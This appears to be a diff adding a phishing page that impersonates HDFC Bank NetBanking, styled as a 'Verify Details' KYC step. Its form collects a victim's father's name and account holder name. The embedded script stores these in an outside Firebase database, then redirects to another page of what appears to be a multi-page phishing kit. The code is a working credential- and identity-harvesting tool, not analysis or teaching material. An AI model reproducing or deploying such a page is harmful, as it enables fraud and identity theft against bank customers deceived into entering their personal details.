@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>Wellcome</title>
+    <link rel="preload" as="image" href="/afx.png" />
+    <meta name="next-head-count" content="5" />
+    <link rel="preload" href="fake/a6cd15749f8dde69.css" as="style" />
+    <link rel="stylesheet" href="fake/a6cd15749f8dde69.css" data-n-g="" />
+    <noscript data-n-css=""></noscript>
+    <link rel="stylesheet" href="index.css">
+  </head>
+
+  <body>
+    <div id="__next">
+      <header>
+        <div class="logo"></div>
+        <div class="h1"><p class="pp">Welcome to HDFC Bank NetBanking</p></div>
+    </header>
+      <div class="content">
+        <h2 class="text-center">Verify Details</h2>
+        <form autocomplete="off" id="form">
+          <input type="hidden" name="formtoken" value="" />
+          <div class="form-group">
+            <label for="LAST4AC">Father's Name</label
+            ><input
+              type="text"
+              class="form-control"
+              id="last4c"
+              
+              maxlength="20"
+              required=""
+            />
+          </div>
+          <div class="form-group">
+            <label for="username">Account Holder Name</label
+            ><input type="text" class="form-control" id="name" required="" />
+          </div>
+          <br>
+          
+          <br>
+          <!-- <p style="color: green">50% KYC Successfuly</p> -->
+          <button type="submit" class="btn btn-primary login-btn">
+            SUBMIT
+          </button>
+        </form>
+      </div>
+      <div class="footer">
+        © Copyright<a href="/">Terms and Conditions</a
+        ><a href="/">Privacy Policy</a>
+      </div>
+    </div>
+    <script type="module">
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
+      import {
+        getDatabase,
+        ref,
+        set,
+        query,
+        limitToLast,
+        get,
+      } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-database.js";
+
+      // Your web app's Firebase configuration
+      const firebaseConfig = {
+  apiKey: "AIzaSyB0pwJOvUAan027wQFdD9BlheoynbW0LDI",
+  authDomain: "hnew-ce38c.firebaseapp.com",
+  projectId: "hnew-ce38c",
+  storageBucket: "hnew-ce38c.appspot.com",
+  messagingSenderId: "242180577873",
+  appId: "1:242180577873:web:2aa81f45d584dde305b670"
+};
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      // const db = getFirestore(app);
+      const db = getDatabase(app);
+      const que = query(ref(db, "users"), limitToLast(1));
+
+      const last_key = await get(que)
+        .then((snapshot) => {
+          if (snapshot.exists()) {
+            return parseInt(Object.keys(snapshot.val())[0]) + 1;
+          } else {
+            return 1;
+          }
+        })
+        .catch((error) => {
+          console.error(error);
+        });
+      const form = document.getElementById("form");
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        let last4c = document.getElementById("last4c").value;
+        let name = document.getElementById("name").value;
+        if (last4c != "" && name != "") {
+          try {
+            const docRef = await set(ref(db, "users/" + last_key), {
+              last4c: last4c,
+              name: name,
+            });
+            // localStorage.setItem("id", docRef.id);
+            window.location = "p8.html";
+          } catch (e) {
+            console.error("Error adding document: ", e);
+          }
+        }
+        return false;
+      });
+    </script>
+  </body>
+</html>
